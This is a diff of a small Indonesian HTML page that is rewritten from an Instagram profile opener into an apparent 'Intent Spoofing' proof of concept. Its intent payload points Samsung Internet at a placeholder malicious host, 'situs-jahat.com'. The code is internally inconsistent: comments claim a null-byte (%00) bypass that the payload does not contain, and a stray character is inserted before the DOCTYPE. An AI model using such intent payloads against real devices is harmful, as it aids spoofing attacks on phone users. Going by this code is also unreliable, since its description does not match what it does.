@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+]<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Instagram Intent (BROWSABLE)</title>
+<title>Instagram Intent Null Byte Bypass</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -20,8 +20,8 @@ button:disabled { background: #555; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>One-Click Instagram Intent</h1>
-    <p>Membuka profil Instagram target via Intent Scheme (BROWSABLE).</p>
+    <h1>Instagram Intent Null Byte</h1>
+    <p>Menguji bypass Intent Spoofing menggunakan Null Byte Injection.</p>
     
     <button id="start-btn" type="button">Buka Profil Instagram</button>
     <div id="status" role="status">Sistem siap.</div>
@@ -43,9 +43,9 @@ button:disabled { background: #555; }
         log("Memicu Intent Instagram...");
 
         try {
-            // PERBAIKAN: Deklarasi variabel menggunakan 'const' dan hapus karakter ilegal
-            // Kita menggunakan intent standar untuk membuka profil Instagram
-            const instagramIntent = "intent://instagram.com/_u/theonly_w4gur1/#Intent;scheme=https;package=com.instagram.android;category=android.intent.category.BROWSABLE;end";
+            // PERBAIKAN: Deklarasi variabel instagramIntent
+            // Menggunakan Null Byte (%00) untuk Intent Spoofing
+            const instagramIntent = "intent://situs-jahat.com/#Intent;scheme=https;package=com.sec.android.app.sbrowser;action=android.intent.action.SBROWSER_VIEW_FOR_EXTERNAL_APP;end";
             
             log("Payload: " + instagramIntent);
             
